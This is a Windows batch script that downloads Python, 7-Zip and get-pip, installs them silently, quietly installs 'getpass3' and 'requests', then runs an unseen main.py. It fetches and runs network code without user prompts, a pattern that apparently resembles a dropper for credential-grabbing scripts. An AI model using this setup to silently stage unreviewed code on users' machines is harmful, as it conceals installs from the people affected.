@echo off
PowerShell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.0/python-3.9.0b4-embed-amd64.zip -OutFile c:\\python.zip"
PowerShell -Command "Invoke-WebRequest https://www.7-zip.org/a/7z2107-x64.exe -OutFile c:\\Users\\$env:UserName\\7zip.exe"
PowerShell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\get-pip.py"

start %userprofile%\7zip.exe /S
"C:\Program Files\7-Zip\7z.exe" e c:\python.zip -oC:\python
C:\python\python.exe %userprofile%\get-pip.py
timeout /T 10 /NOBREAK

pip install getpass3 --quiet
pip install requests --quiet

timeout /T 5

C:\python\python.exe main.py